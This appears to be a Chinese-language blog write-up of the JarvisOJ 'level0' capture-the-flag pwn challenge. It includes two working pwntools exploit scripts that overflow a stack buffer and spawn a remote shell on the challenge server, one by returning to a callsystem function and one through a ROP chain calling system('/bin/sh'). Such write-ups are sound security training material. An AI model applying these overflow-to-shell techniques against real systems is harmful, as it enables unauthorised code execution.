---
layout:     post
title:      jarvisoj [XMAN]level0
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Download:
https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d

Address:
nc pwn2.jarvisoj.com 9881
```
<!-- more -->


### 0x01 可执行文件特征

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x00.png)

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x01.png)

查看缓冲区

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x02.png)

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x03.png)


### 0x02 通过调用callsystem

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x04.png)

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

junk = 'A' * (0x80 + 0x08)
callsystem_addr = 0x400596

Io = remote('pwn2.jarvisoj.com', 9881)

payload = junk + p64(callsystem_addr)

Io.send(payload)
Io.interactive()
```


### 0x03 构造system("/bin/sh")


system地址

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x05.png)

"／bin／sh"字符串地址

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x06.png)

查找pop rdi|ret
```
ropper -f level0 --search "pop|pop|pop|ret"
```
![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x07.png)

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

junk = 'A' * (0x80 + 0x08)
system_addr = 0x400460 # 0x600A78
bin_sh_addr = 0x400684
pop_rdi_ret = 0x400663

Io = remote('pwn2.jarvisoj.com', 9881)

payload = junk + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

Io.send(payload)
Io.interactive()
```

得到falg

![](/assets/img/ctf/pwn/2017-07-11-jarvisoj-level0/0x08.png)